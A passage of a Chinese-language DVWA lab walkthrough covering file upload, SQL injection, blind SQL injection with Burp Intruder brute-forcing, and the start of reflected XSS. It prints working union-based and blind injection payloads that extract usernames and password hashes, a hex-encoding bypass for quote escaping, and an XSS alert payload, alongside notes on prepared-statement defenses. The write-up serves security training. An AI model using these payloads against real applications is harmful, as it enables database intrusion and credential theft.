$uploaded_tmp );<br>            imagejpeg( $img, $temp_file, 100);<br>        &#125;<br>        else &#123;<br>            $img = imagecreatefrompng( $uploaded_tmp );<br>            imagepng( $img, $temp_file, 9);<br>        &#125;<br>        imagedestroy( $img );<br><br>        // Can we move the file to the web root from the temp folder?<br>        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;<br>            // Yes!<br>            echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;<br>        &#125;<br>        else &#123;<br>            // No<br>            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;<br>        &#125;<br><br>        // Delete any temp files<br>        if( file_exists( $temp_file ) )<br>            unlink( $temp_file );<br>    &#125;<br>    else &#123;<br>        // Invalid file<br>        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>// Generate Anti-CSRF token<br>generateSessionToken();<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>token用于防御csrf。</p><p>防范非常严密，上传后的文件会被验证、重建还会被改名，然后再提交。</p><blockquote><p>函数uniqid （）：基于以微秒计的当前时间，生成一个唯一的ID</p><p>函数ini_get （）：报道查看函数相应选项对话</p><p>函数sys_get_temp_dir （）：用于报道查看临时文件的目录</p><p>函数imagecreatefromjpeg （文件名）：函数返回图片文件的图像标识，失败返回错误的</p><p>函数imagejpeg （图像，文件名，质量）：从图像图像以文件名为文件名创建一个JPEG图像，可选参数质量，范围从0（最差质量，文件更小）到100（最佳质量，文件最大）。</p><p>函数imagedestroy （）：函数销毁图像资源</p><p>函数rename （）：重命名文件或目录</p><p>函数getcwd （）：获取当前工作目录</p></blockquote><h1 id="七、SQL-Injection（sql注入）"><a href="#七、SQL-Injection（sql注入）" class="headerlink" title="七、SQL Injection（sql注入）"></a>七、SQL Injection（sql注入）</h1><h2 id="1-low-5"><a href="#1-low-5" class="headerlink" title="1.low"></a>1.low</h2><p>界面：一个输入框</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145031198.png" alt="image-20210701145031198"></p><p>源码：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145723133.png" alt="image-20210701145723133" style="zoom:50%;" /><p>get输入的id的值，然后将id在数据库查询，查询后输出first name和last name。</p><p>过程中并没有对输入查询的id值进行任何的检测和过滤。</p><p>按照步骤进行sql注入。</p><p><strong>1.判断注入类型</strong></p><p><code>1 and 1=1#</code>和<code>1 and 1=2#</code>都有正常的回显，所以并不是数字型，</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104752146.png" alt="image-20210702104752146"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104808518.png" alt="image-20210702104808518"></p><p><code>1&#39; and &#39;1&#39;=&#39;1</code>  有正常回显。 <code>1&#39; and &#39;1&#39;=&#39;2</code>无回显。</p><p>所以是<strong>字符型</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105150396.png" alt="image-20210702105150396"></p><p>【<code>1&#39; and &#39;1&#39;=&#39;2</code>无回显⬇️】</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105459200.png" alt="image-20210702105459200"></p><p><strong>2.判断列数</strong></p><p>运用<strong>order by</strong>判断列数。</p><p>（order by语句用于根据指定的列对结果集进行排序）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105951083.png" alt="image-20210702105951083"></p><p>order by到3就报错了，所以列数为3。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110313691.png" alt="image-20210702110313691"></p><p><strong>3.判断回显位置</strong></p><p>使用<strong>union</strong>联合查询，<strong>select</strong>语句进行判断回显位置。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110750153.png" alt="image-20210702110750153"></p><p>1回显在first name，2回显在surname上。</p><p>**4.**数据库名</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111319538.png" alt="image-20210702111319538"></p><p>数据库名为dvwa。</p><p><strong>5.表名</strong></p><p>group_concat（），将多个字符串连在一起。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111909275.png" alt="image-20210702111909275"></p><p>表有两个：guestbook，users</p><p><strong>6.列名</strong></p><p>查询方式和查表名方式相同。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702113607946.png" alt="image-20210702113607946"></p><p>列名：user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p><p><strong>7.数据</strong></p><p>查看用户和密码。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114209072.png" alt="image-20210702114209072"></p><p>密码用md5加密过，所以去md5解密网站（例如<a href="https://www.cmd5.com/">cmd5</a>）进行解密即可得到admin的密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114325809.png" alt="image-20210702114325809"></p><h2 id="2-medium-5"><a href="#2-medium-5" class="headerlink" title="2.medium"></a>2.medium</h2><p>界面：无输入框，只能选择。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20210702142548059.png" alt="image-20210702142548059"></p><p>url：提交后url无显示（post提交）</p><p>源码：错误后回显示错误信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702143231925.png" alt="image-20210702143231925"></p><p>可以看出确实是post提交。</p><p>用bp抓一下包，知道了提交的数据格式。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702144128734.png" alt="image-20210702144128734"></p><p>可以选择用hackbar，也可以用bp进行接下来的操作。</p><p><strong>1.注入类型判断</strong></p><p>1 and 1&#x3D;1回显正常，1 and 1&#x3D;2回显错误。</p><p>数字型注入。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145305587.png" alt="image-20210702145305587"></p><p><strong>2.判断列数</strong></p><p>order by 到3报错，所以列数为2.</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145441034.png" alt="image-20210702145441034"></p><p><strong>3.判断回显位置</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145558230.png" alt="image-20210702145558230"></p><p><strong>4.数据库名</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">id=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145833451.png" alt="image-20210702145833451"></p><p><strong>5.列表名</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702151014456.png" alt="image-20210702151014456"></p><p>gustbook和users两个表。</p><p><strong>6.查询字段</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure><p>显示报错，报错信息如下。</p><blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;\&#x27;users\&#x27;&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></blockquote><p>单引号被转义了，<code>&#39;</code>变成了<code>\&#39;</code>。</p><p>把字符串user转换为十六进制进行绕过。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x7573657273</span>#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702155816655.png" alt="image-20210702155816655"></p><p><strong>7.查询数据</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702160231683.png" alt="image-20210702160231683"></p><h2 id="3-high-5"><a href="#3-high-5" class="headerlink" title="3.high"></a>3.high</h2><p>界面：点击连接后弹窗。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162231237.png" alt="image-20210702162231237"></p><p>源码：错误后显示something went wrong。实际上和medium的源码并没有太大的差别。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162343418.png" alt="image-20210702162343418"></p><p><strong>1.判断注入类型</strong></p><p>字符型注入。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163500790.png" alt="image-20210702163500790"></p><p><strong>2.判断列数</strong></p><p>3报错，所以列数为2.</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702163641113.png" alt="image-20210702163641113"></p><p>后面的操作和前面级别的操作并没有什么不同。</p><p>很疑惑弄在两个页面有什么意义，查询了之后才得到了解答。</p><blockquote><p>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入。</p><p>因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p></blockquote><h2 id="4-impossible-5"><a href="#4-impossible-5" class="headerlink" title="4.impossible"></a><strong>4.impossible</strong></h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702170109179.png" alt="image-20210702170109179"></p><p> checktoken对token进行检查，防止crsf攻击。</p><p>还使用了sql预编译，预编译语句的优势在于归纳为：<strong>一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入。</strong></p><p>通俗来说，预编译就是提前做好了模板，用户进行的输入都是作为数据输入，不会进行任何逻辑操作。</p><p>而且还限制了只允许返回一条数据。</p><h1 id="八、SQL-Injection-Blind-（sql盲注）"><a href="#八、SQL-Injection-Blind-（sql盲注）" class="headerlink" title="八、SQL Injection (Blind) （sql盲注）"></a>八、SQL Injection (Blind) （sql盲注）</h1><h2 id="1-low-6"><a href="#1-low-6" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702172545641.png" alt="image-20210702172545641"></p><p>没有过滤。</p><p>输入一个id号，只会有存在与否的提示，并没有数据的回显。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706112621857.png" alt="image-20210706112621857"></p><h3 id="（1）判断注入类型"><a href="#（1）判断注入类型" class="headerlink" title="（1）判断注入类型"></a><strong>（1）判断注入类型</strong></h3><p><code>1&#39; and &#39;1&#39;=&#39;1</code>显示id存在于数据库。</p><p><code>1&#39; and &#39;1&#39;=&#39;2</code>显示id不存在于数据库。</p><p>所以是字符型注入。</p><p>判断列数：</p><p><code>1&#39; order by 3#</code>时报错。</p><p>说明列数为2.</p><p>实际上这一项对用处不大，因为判断出了列数也无法查看回显位置。</p><h3 id="（2）猜解数据库名长度"><a href="#（2）猜解数据库名长度" class="headerlink" title="（2）猜解数据库名长度"></a><strong>（2）猜解数据库名长度</strong></h3><p>使用length函数，猜解database的名字长度。当结果猜解正确，回显也会显示为真。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(database())=<span class="hljs-number">1</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>输入4时显示显示为真，所以名字长度为4.</p><h3 id="（3）猜解数据库名"><a href="#（3）猜解数据库名" class="headerlink" title="（3）猜解数据库名"></a><strong>（3）猜解数据库名</strong></h3><p>一个一个对猜解数据库名，可以用到的函数有很多。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#left(从左侧截取database（）的前n位)</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left(database(),1)&gt;&#x27;</span>a<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">#ascii(两个1分别代表起始位和长度)，判断ascii码是否大于97</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span><br><br><span class="hljs-meta">#regexp正则表达</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select database()) regexp &#x27;</span>^a<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()) regexp <span class="hljs-string">&#x27;^dv&#x27;</span>#<br><br><span class="hljs-meta">#like，和regexp用法相似</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select database()) like &#x27;</span>dv%<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>一个个试太慢了，尝试用bp抓包爆破。</p><p>*<strong>bp爆破</strong></p><p>以left为例子，构造语句：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p>抓包，send to intruder。</p><p>设置类型为<strong>cluster bomb</strong>，设置爆破点（起始位和ascii数字）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142332397.png" alt="image-20210706142332397"></p><p>payload1设置为number，由于之前猜解了长度为4，所以设置长度为4。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142419716.png" alt="image-20210706142419716"></p><p>payload2也设置为number类型，范围为97-122（a-z的ascii范围）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142551875.png" alt="image-20210706142551875"></p><p>attack，状态码为200的就是每一位的正确字母。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706142251420.png" alt="image-20210706142251420"></p><p>将数字转码，得到数据库名——dvwa。</p><h3 id="（4）猜解表名"><a href="#（4）猜解表名" class="headerlink" title="（4）猜解表名"></a><strong>（4）猜解表名</strong></h3><p>和猜解数据库的方式相似。</p><ul><li><strong>先猜解有该数据库有几个表。</strong></li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;dvwa&#x27;</span>)=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>到2的时候显示为真，说明有两个表。</p><ul><li><strong>猜解表的长度</strong></li></ul><p>第一个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>第二个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">length</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),2))</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>测试后第一个表的长度为9，第二个表的长度为5.</p><ul><li><strong>猜解表的名字</strong></li></ul><p>第一个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706150211720.png" alt="image-20210706150211720"></p><p><strong>guestbook</strong>。</p><p>第二个表：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">2</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706151158000.png" alt="image-20210706151158000"></p><p><strong>users</strong>。</p><h3 id="（5）猜解字段名"><a href="#（5）猜解字段名" class="headerlink" title="（5）猜解字段名"></a><strong>（5）猜解字段名</strong></h3><p>和表名差别不大。</p><p>查询users表字段个数。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">count</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>查询的结果为8.</p><p>剩下的一个个查太麻烦了，还是使用爆破吧，如果数据量不是特别大，直接爆破名字也是可行的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706153554762.png" alt="image-20210706153554762"></p><p>结果为：<strong>user_id</strong>。</p><p>第二个：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">ascii</span>(<span class="hljs-params">substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span></span>),1))</span>=<span class="hljs-number">97</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>查询完所有的字段名为：</p><p>user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p><h3 id="（6）猜解用户名"><a href="#（6）猜解用户名" class="headerlink" title="（6）猜解用户名"></a><strong>（6）猜解用户名</strong></h3><p>第一个用户：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select user from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706154843388.png" alt="image-20210706154843388"></p><p><strong>admin</strong></p><p>第二个用户：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select user from users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p><strong>gordonb</strong></p><p>就不一个一个试了。</p><h3 id="（7）猜解密码"><a href="#（7）猜解密码" class="headerlink" title="（7）猜解密码"></a><strong>（7）猜解密码</strong></h3><p>猜解admin的密码，也就是password的表中的第一个。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p>结果为admin。</p><h2 id="2-medium-6"><a href="#2-medium-6" class="headerlink" title="2.medium"></a>2.medium</h2><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160610549.png" alt="image-20210706160610549"></p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160533944.png" alt="image-20210706160533944"></p><p>post类型。</p><p>bp抓包进行注入。</p><p>测试后发现，为数字型注入。</p><p>本身没有什么过滤，只要注意语句格式为数字型注入，还有单引号被过滤（和sql注入一样用十六进制绕过），其他没有什么不同。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160856446.png" alt="image-20210706160856446"></p><h2 id="3-high-6"><a href="#3-high-6" class="headerlink" title="3.high"></a>3.high</h2><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161153872.png" alt="image-20210706161153872"></p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161221694.png" alt="image-20210706161221694"></p><p>只有随机sleep的限制。</p><p>弹出对sqlmap起到了一定的限制。</p><p>测试后为字符型注入，其他的操作和low级别并没有什么不同。</p><h2 id="4-impossible-6"><a href="#4-impossible-6" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161852820.png" alt="image-20210706161852820"></p><p>同样和sql注入的impossible级别差别不大。</p><p>获取token并验证，pdo机制，使用了sql预编译，数据每次只返回一条。</p><p>暂时无方法绕过。</p><h1 id="九、xss（reflected）反射型"><a href="#九、xss（reflected）反射型" class="headerlink" title="九、xss（reflected）反射型"></a>九、xss（reflected）反射型</h1><h2 id="1-low-7"><a href="#1-low-7" class="headerlink" title="1.low"></a>1.low</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173105531.png" alt="image-20210702173105531"></p><p>输入name，输出name。</p><p>没有任何过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功弹出。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173429626.png" 